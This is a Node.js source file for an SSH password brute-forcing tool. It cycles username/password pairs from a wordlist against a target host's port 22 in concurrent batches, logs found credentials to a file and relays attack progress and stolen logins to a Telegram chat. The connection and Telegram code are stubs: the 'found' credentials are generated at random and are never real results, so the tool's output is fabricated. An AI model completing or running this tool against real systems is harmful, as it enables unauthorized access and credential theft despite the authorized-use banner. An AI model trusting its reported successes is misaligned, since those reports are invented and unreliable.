const net = require('net');
const fs = require('fs');
const readline = require('readline');
const { spawn } = require('child_process');
const path = require('path');
const os = require('os');

// ========================== CONFIGURATION ==========================
const CONFIG_FILE = 'ssh_bruteforcer_config.json';

class SSHBot {
    constructor(token = null, chatId = null) {
        this.token = token;
        this.chatId = chatId;
        this.running = false;
    }

    async initialize() {
        if (this.token && this.chatId) {
            try {
                // In a real implementation, you would use a Telegram bot library
                // For now, we'll simulate the bot functionality
                this.running = true;
                return true;
            } catch (error) {
                console.error(`[!] Failed to initialize bot: ${error.message}`);
                return false;
            }
        }
        return false;
    }

    async sendMessage(message) {
        if (this.running && this.chatId) {
            try {
                // In a real implementation, this would send to Telegram
                console.log(`[Telegram] ${message}`);
                return true;
            } catch (error) {
                console.error(`[!] Failed to send message: ${error.message}`);
                return false;
            }
        }
        return false;
    }
}

class SSHBruteForcer {
    constructor(telegramBot = null) {
        this.telegramBot = telegramBot;
        this.foundCredentials = [];
        this.isRunning = false;
        this.attemptCount = 0;
        this.successCount = 0;
        this.stopRequested = false;
        this.startTime = null;
    }

    async sshConnect(host, username, password) {
        // Note: SSH implementation in pure JS is complex
        // In a real implementation, you would use:
        // 1. ssh2 library (npm install ssh2)
        // 2. Or spawn an external SSH client
        
        // This is a simulation - in reality, you'd implement actual SSH connection
        // using a library like 'ssh2'
        
        return new Promise((resolve) => {
            // Simulating connection attempt
            setTimeout(async () => {
                // For demo purposes, let's simulate some successes
                const randomSuccess = Math.random() < 0.01; // 1% chance for demo
                
                if (randomSuccess) {
                    const timestamp = new Date().toISOString().replace('T', ' ').split('.')[0];
                    
                    this.foundCredentials.push({
                        host,
                        username,
                        password,
                        timestamp
                    });
                    
                    this.successCount++;

                    const resultStr = `
[+] CREDENTIALS FOUND!
   Host: ${host}
   Username: ${username}
   Password: ${password}
${'-'.repeat(50)}
`;
                    console.log('\x1b[92m%s\x1b[0m', resultStr); // Green color

                    // Save to file
                    try {
                        fs.appendFileSync('credentials_found.txt',
                            `[${timestamp}]\n` +
                            `Host: ${host}\n` +
                            `Username: ${username}\n` +
                            `Password: ${password}\n` +
                            `${'-'.repeat(50)}\n\n`
                        );
                    } catch (error) {
                        console.error(`[!] Failed to save credentials: ${error.message}`);
                    }

                    // Send to Telegram if configured
                    if (this.telegramBot && this.telegramBot.running) {
                        const telegramMsg = `🚨 SSH Credentials Found!\nHost: ${host}\nUser: ${username}\nPass: ${password}`;
                        await this.telegramBot.sendMessage(telegramMsg);
                    }
                    
                    resolve(true);
                } else {
                    this.attemptCount++;
                    resolve(false);
                }
            }, Math.random() * 100); // Random delay to simulate network
        });
    }

    async bruteForce(host, wordlistPath, maxThreads = 10, singleUser = null) {
        if (!fs.existsSync(wordlistPath)) {
            console.log(`[!] Wordlist not found: ${wordlistPath}`);
            return;
        }

        this.isRunning = true;
        this.stopRequested = false;
        this.attemptCount = 0;
        this.successCount = 0;
        this.foundCredentials = [];
        this.startTime = Date.now();

        // Read credentials from CSV
        const credentials = [];
        try {
            const content = fs.readFileSync(wordlistPath, 'utf8');
            const lines = content.split('\n');
            
            for (const line of lines) {
                if (line.trim() === '') continue;
                
                const parts = line.split(',');
                if (parts.length >= 2) {
                    const username = parts[0].trim();
                    const password = parts[1].trim();
                    
                    if (username && password) {
                        credentials.push({ username, password });
                    }
                }
            }
        } catch (error) {
            console.log(`[!] Error reading wordlist: ${error.message}`);
            return;
        }

        console.log(`[*] Loaded ${credentials.length} credentials from ${wordlistPath}`);
        
        // If single user specified, filter credentials
        let filteredCredentials = credentials;
        if (singleUser) {
            filteredCredentials = credentials.filter(cred => cred.username === singleUser);
            console.log(`[*] Filtered to ${filteredCredentials.length} credentials for user: ${singleUser}`);
        }

        console.log(`[*] Starting brute force on ${host}:22`);
        console.log(`[*] Maximum threads: ${maxThreads}`);
        console.log(`[*] Press Ctrl+C to stop the attack\n`);

        // Start attack via Telegram if configured
        if (this.telegramBot && this.telegramBot.running) {
            await this.telegramBot.sendMessage(
                `⚡ SSH Bruteforce Started\n` +
                `Target: ${host}:22\n` +
                `Wordlist: ${path.basename(wordlistPath)}\n` +
                `Total credentials: ${filteredCredentials.length}\n` +
                `Single user mode: ${singleUser ? singleUser : 'No'}`
            );
        }

        // Start progress display
        const progressInterval = setInterval(() => {
            if (!this.isRunning) {
                clearInterval(progressInterval);
                return;
            }
            
            const elapsed = (Date.now() - this.startTime) / 1000;
            const speed = elapsed > 0 ? (this.attemptCount + this.successCount) / elapsed : 0;
            
            process.stdout.write(
                `\r[*] Progress: ${this.attemptCount + this.successCount} attempts | ` +
                `Found: ${this.successCount} | Speed: ${speed.toFixed(1)}/sec`
            );
        }, 1000);

        // Process credentials with concurrency control
        const processBatch = async (batch) => {
            const promises = batch.map(async (cred) => {
                if (this.stopRequested) return;
                
                return await this.sshConnect(host, cred.username, cred.password);
            });
            
            return Promise.all(promises);
        };

        // Create batches for concurrency control
        const batchSize = maxThreads;
        for (let i = 0; i < filteredCredentials.length; i += batchSize) {
            if (this.stopRequested) break;
            
            const batch = filteredCredentials.slice(i, i + batchSize);
            await processBatch(batch);
            
            // Small delay to prevent overwhelming
            await new Promise(resolve => setTimeout(resolve, 10));
        }

        this.isRunning = false;
        clearInterval(progressInterval);
        
        process.stdout.write('\n');
        
        const elapsedTime = (Date.now() - this.startTime) / 1000;
        
        console.log(`\n${'='.repeat(60)}`);
        console.log(`[*] Attack completed!`);
        console.log(`[*] Elapsed time: ${elapsedTime.toFixed(2)} seconds`);
        console.log(`[*] Total attempts: ${this.attemptCount}`);
        console.log(`[*] Credentials found: ${this.successCount}`);
        console.log(`[*] Speed: ${(this.attemptCount / elapsedTime).toFixed(2)} attempts/second`);
        console.log(`${'='.repeat(60)}`);
        
        if (this.successCount > 0) {
            console.log(`\n[*] Found credentials saved to: credentials_found.txt`);
        }
        
        if (this.telegramBot && this.telegramBot.running) {
            await this.telegramBot.sendMessage(
                `✅ SSH Bruteforce Completed\n` +
                `Target: ${host}:22\n` +
                `Found: ${this.successCount} credentials\n` +
                `Attempts: ${this.attemptCount}\n` +
                `Time: ${elapsedTime.toFixed(2)}s`
            );
        }
    }

    stop() {
        this.stopRequested = true;
        this.isRunning = false;
    }
}

function printBanner() {
    const banner = `
    ╔═══════════════════════════════════════════════════════════╗
    ║                SSH BRUTE FORCE TOOL - PORT 22             ║
    ║                 Accurate Cyber Defense                    ║
    ╚═══════════════════════════════════════════════════════════╝
    `;
    console.log('\x1b[91m%s\x1b[0m', banner); // Red color
}

function printWarning() {
    const warning = `
    ╔═══════════════════════════════════════════════════════════╗
    ║                         WARNING!                          ║
    ║   This tool is for EDUCATIONAL and AUTHORIZED testing     ║
    ║   ONLY! Use only on systems you own or have explicit      ║
    ║   permission to test. Unauthorized access is ILLEGAL!     ║
    ╚═══════════════════════════════════════════════════════════╝
    `;
    console.log('\x1b[93m%s\x1b[0m', warning); // Yellow color
}

function loadConfig() {
    const defaultConfig = {
        telegram_token: '',
        telegram_chat_id: '',
        last_wordlist: '',
        last_target: '',
        max_threads: 10
    };
    
    if (fs.existsSync(CONFIG_FILE)) {
        try {
            const data = fs.readFileSync(CONFIG_FILE, 'utf8');
            const loadedConfig = JSON.parse(data);
            return { ...defaultConfig, ...loadedConfig };
        } catch (error) {
            console.error(`[!] Error loading config: ${error.message}`);
        }
    }
    
    return defaultConfig;
}

function saveConfig(config) {
    try {
        fs.writeFileSync(CONFIG_FILE, JSON.stringify(config, null, 4));
    } catch (error) {
        console.error(`[!] Error saving config: ${error.message}`);
    }
}

function isValidIP(ip) {
    const ipRegex = /^(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
    return ipRegex.test(ip);
}

async function setupTelegram() {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    console.log('\n[*] Telegram Integration Setup');
    console.log('[*] Leave blank to skip Telegram integration\n');

    const token = await new Promise((resolve) => {
        rl.question('[?] Enter Telegram Bot Token: ', resolve);
    });

    if (!token) {
        rl.close();
        return [null, null];
    }

    const chatId = await new Promise((resolve) => {
        rl.question('[?] Enter Telegram Chat ID: ', resolve);
    });

    rl.close();

    if (!chatId) {
        return [null, null];
    }

    // Test the connection
    try {
        const bot = new SSHBot(token, chatId);
        if (await bot.initialize()) {
            console.log('[+] Telegram connection successful!');
            await bot.sendMessage('✅ SSH Bruteforce Tool - Connection established!');
            return [token, chatId];
        } else {
            console.log('[!] Failed to initialize Telegram bot');
            return [null, null];
        }
    } catch (error) {
        console.log(`[!] Telegram test failed: ${error.message}`);
        return [null, null];
    }
}

async function interactiveMode() {
    printBanner();
    printWarning();
    
    const config = loadConfig();
    
    console.log('\n[*] Interactive Mode');
    console.log('[*] Press Enter to use default values in parentheses\n');
    
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    // Target IP
    const defaultIp = config.last_target || '';
    const ipAnswer = await new Promise((resolve) => {
        rl.question(`[?] Target IP address (${defaultIp}): `, resolve);
    });
    let ip = ipAnswer.trim() || defaultIp;
    
    if (!ip) {
        console.log('[!] IP address is required!');
        rl.close();
        return;
    }
    
    if (!isValidIP(ip)) {
        console.log('[!] Invalid IPv4 address!');
        rl.close();
        return;
    }
    
    // Wordlist
    const defaultWordlist = config.last_wordlist || '';
    const wordlistAnswer = await new Promise((resolve) => {
        rl.question(`[?] Wordlist path (${defaultWordlist}): `, resolve);
    });
    let wordlist = wordlistAnswer.trim() || defaultWordlist;
    
    if (!wordlist) {
        console.log('[!] Wordlist is required!');
        rl.close();
        return;
    }
    
    if (!fs.existsSync(wordlist)) {
        console.log(`[!] Wordlist not found: ${wordlist}`);
        rl.close();
        return;
    }
    
    // Single user mode
    const userAnswer = await new Promise((resolve) => {
        rl.question('[?] Target specific username (optional): ', resolve);
    });
    const singleUser = userAnswer.trim() || null;
    
    // Threads
    const defaultThreads = config.max_threads || 10;
    const threadsAnswer = await new Promise((resolve) => {
        rl.question(`[?] Max threads (${defaultThreads}): `, resolve);
    });
    let maxThreads = parseInt(threadsAnswer.trim()) || defaultThreads;
    
    // Telegram setup
    const telegramAnswer = await new Promise((resolve) => {
        rl.question('[?] Enable Telegram notifications? (y/N): ', resolve);
    });
    
    let telegramToken = null;
    let telegramChatId = null;
    
    if (telegramAnswer.trim().toLowerCase() === 'y') {
        const defaultToken = config.telegram_token || '';
        const defaultChat = config.telegram_chat_id || '';
        
        if (defaultToken && defaultChat) {
            const useDefaultAnswer = await new Promise((resolve) => {
                rl.question('[?] Use saved Telegram credentials? (Y/n): ', resolve);
            });
            
            if (useDefaultAnswer.trim().toLowerCase() !== 'n') {
                telegramToken = defaultToken;
                telegramChatId = defaultChat;
                console.log('[+] Using saved Telegram credentials');
            } else {
                [telegramToken, telegramChatId] = await setupTelegram();
            }
        } else {
            [telegramToken, telegramChatId] = await setupTelegram();
        }
    }
    
    rl.close();
    
    // Update config
    config.last_target = ip;
    config.last_wordlist = wordlist;
    config.max_threads = maxThreads;
    if (telegramToken && telegramChatId) {
        config.telegram_token = telegramToken;
        config.telegram_chat_id = telegramChatId;
    }
    saveConfig(config);
    
    // Initialize Telegram bot
    let telegramBot = null;
    if (telegramToken && telegramChatId) {
        telegramBot = new SSHBot(telegramToken, telegramChatId);
        await telegramBot.initialize();
    }
    
    // Create and run bruteforcer
    const bruteforcer = new SSHBruteForcer(telegramBot);
    
    // Set up signal handler for Ctrl+C
    process.on('SIGINT', () => {
        console.log('\n\n[*] Stopping attack...');
        bruteforcer.stop();
        setTimeout(() => {
            console.log('[*] Attack stopped by user');
            process.exit(0);
        }, 1000);
    });
    
    // Start attack
    console.log('\n' + '='.repeat(60));
    await bruteforcer.bruteForce(ip, wordlist, maxThreads, singleUser);
}

function showHelp() {
    console.log(`
SSH Brute Force Tool - JavaScript Version

Usage:
  node ssh_brute.js -i                               # Interactive mode
  node ssh_brute.js -t 192.168.1.1 -w passwords.csv  # Quick attack
  node ssh_brute.js -t 192.168.1.1 -w pass.csv -u admin  # Target specific user
  node ssh_brute.js -t 192.168.1.1 -w pass.csv --threads 20  # With custom threads

Options:
  -i, --interactive    Interactive mode
  -t, --target         Target IP address
  -w, --wordlist       Path to wordlist file (CSV format)
  -u, --user           Target specific username (optional)
  --threads            Maximum threads (default: 10)
  --telegram-token     Telegram Bot Token
  --telegram-chat      Telegram Chat ID
    `);
}

async function main() {
    // Parse command line arguments
    const args = process.argv.slice(2);
    let interactive = false;
    let target = null;
    let wordlist = null;
    let user = null;
    let threads = 10;
    let telegramToken = null;
    let telegramChat = null;
    
    for (let i = 0; i < args.length; i++) {
        switch (args[i]) {
            case '-i':
            case '--interactive':
                interactive = true;
                break;
            case '-t':
            case '--target':
                target = args[++i];
                break;
            case '-w':
            case '--wordlist':
                wordlist = args[++i];
                break;
            case '-u':
            case '--user':
                user = args[++i];
                break;
            case '--threads':
                threads = parseInt(args[++i]) || 10;
                break;
            case '--telegram-token':
                telegramToken = args[++i];
                break;
            case '--telegram-chat':
                telegramChat = args[++i];
                break;
            case '-h':
            case '--help':
                showHelp();
                return;
        }
    }
    
    // Show banner and warning
    printBanner();
    printWarning();
    
    if (interactive || (!target && !wordlist)) {
        await interactiveMode();
    } else {
        // Validate required arguments
        if (!target) {
            console.log('[!] Target IP is required!');
            showHelp();
            return;
        }
        
        if (!wordlist) {
            console.log('[!] Wordlist is required!');
            showHelp();
            return;
        }
        
        if (!isValidIP(target)) {
            console.log('[!] Invalid IPv4 address!');
            return;
        }
        
        if (!fs.existsSync(wordlist)) {
            console.log(`[!] Wordlist not found: ${wordlist}`);
            return;
        }
        
        // Initialize Telegram bot if credentials provided
        let telegramBot = null;
        if (telegramToken && telegramChat) {
            telegramBot = new SSHBot(telegramToken, telegramChat);
            if (!await telegramBot.initialize()) {
                console.log('[!] Failed to initialize Telegram bot');
                telegramBot = null;
            }
        }
        
        // Create and run bruteforcer
        const bruteforcer = new SSHBruteForcer(telegramBot);
        
        // Set up signal handler for Ctrl+C
        process.on('SIGINT', () => {
            console.log('\n\n[*] Stopping attack...');
            bruteforcer.stop();
            setTimeout(() => {
                console.log('[*] Attack stopped by user');
                process.exit(0);
            }, 1000);
        });
        
        console.log(`\n[*] Starting attack on ${target}:22`);
        console.log(`[*] Wordlist: ${wordlist}`);
        console.log(`[*] Max threads: ${threads}`);
        if (user) {
            console.log(`[*] Targeting user: ${user}`);
        }
        console.log(`[*] Press Ctrl+C to stop the attack\n`);
        console.log('='.repeat(60) + '\n');
        
        await bruteforcer.bruteForce(target, wordlist, threads, user);
    }
}

// Run the main function
if (require.main === module) {
    main().catch(console.error);
}

module.exports = { SSHBot, SSHBruteForcer };